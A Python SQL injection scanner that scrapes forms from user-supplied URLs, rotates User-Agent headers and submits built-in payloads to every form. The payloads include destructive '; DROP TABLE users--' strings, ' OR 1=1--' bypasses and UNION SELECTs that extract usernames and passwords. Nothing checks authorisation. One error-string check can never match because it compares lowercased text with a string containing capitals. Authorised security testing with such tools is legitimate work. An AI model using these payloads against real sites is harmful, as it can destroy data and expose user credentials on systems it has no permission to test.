import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import logging
import random

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class Scanner:
    def __init__(self, user_agents=None):
        self.session = requests.Session()
        self.user_agents = user_agents or [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36",
            # Add more user agents as needed
        ]
        self.rotate_user_agent()

    def rotate_user_agent(self):
        self.session.headers["User-Agent"] = random.choice(self.user_agents)

    def get_forms(self, url):
        try:
            response = self.session.get(url)
            response.raise_for_status()
            soup = BeautifulSoup(response.content, "html.parser")
            return soup.find_all("form")
        except requests.exceptions.RequestException as e:
            logger.error(f"Error getting forms from {url}: {e}")
            return []

    def form_details(self, form):
        details_of_form = {}
        try:
            action = form.attrs.get("action")
            method = form.attrs.get("method", "get")
            inputs = []

            for input_tag in form.find_all("input"):
                input_type = input_tag.attrs.get("type", "text")
                input_name = input_tag.attrs.get("name")
                input_value = input_tag.attrs.get("value", "")
                inputs.append({
                    "type": input_type,
                    "name": input_name,
                    "value": input_value,
                })

            details_of_form['action'] = action
            details_of_form['method'] = method
            details_of_form['inputs'] = inputs
        except Exception as e:
            logger.error(f"Error extracting form details: {e}")
            details_of_form = {}

        return details_of_form

    def vulnerable(self, response):
        errors = {"quoted string not properly terminated",
                  "unclosed quotation mark after the character string",
                  "you have an error in your SQL syntax"
                 }
        for error in errors:
            if error in response.content.decode().lower():
                return True
        return False

    def sql_injection_scan(self, url, custom_payloads=None):
        forms = self.get_forms(url)
        logger.info(f"[+] Detected {len(forms)} forms on {url}.")

        for form in forms:
            details = self.form_details(form)

            for injection_payload in custom_payloads or [
                "'; DROP TABLE users--",
                "'; SELECT * FROM users--",
                "1; DROP TABLE users--",
                "' OR 1=1--",
                '" OR ""="',
                "test' UNION SELECT 1, username, password FROM users--",
                "test' OR '1'='1'--",
                "test' AND 1=0 UNION ALL SELECT NULL, username, password FROM users--",
            ]:
                data = {}
                for input_tag in details["inputs"]:
                    if input_tag["type"] == "hidden" or input_tag["value"]:
                        data[input_tag['name']] = input_tag["value"] + injection_payload
                    elif input_tag["type"] != "submit":
                        data[input_tag['name']] = f"test{injection_payload}"

                res = None  # Initialize res to None before the loop

                try:
                    self.rotate_user_agent()
                    if details["method"] == "post":
                        res = self.session.post(urljoin(url, details['action']), data=data)
                    elif details["method"] == "get":
                        res = self.session.get(urljoin(url, details['action']), params=data)
                except requests.exceptions.RequestException as e:
                    logger.error(f"Error during HTTP request: {e}")

                if res is not None and self.vulnerable(res):
                    logger.warning("SQL injection attack vulnerability in link: %s", url)
                else:
                    logger.info("No SQL injection attack vulnerability detected for %s", url)
                if res is not None:
                    logger.debug("Response Content: %s", res.content)
                else:
                    logger.debug("No response content available.")


if __name__ == "__main__":
    scanner = Scanner()
    urls_to_be_checked = input("Enter the URLs (comma-separated) to check for SQL injection vulnerabilities: ").split(',')

    for url in urls_to_be_checked:
        scanner.sql_injection_scan(url.strip())
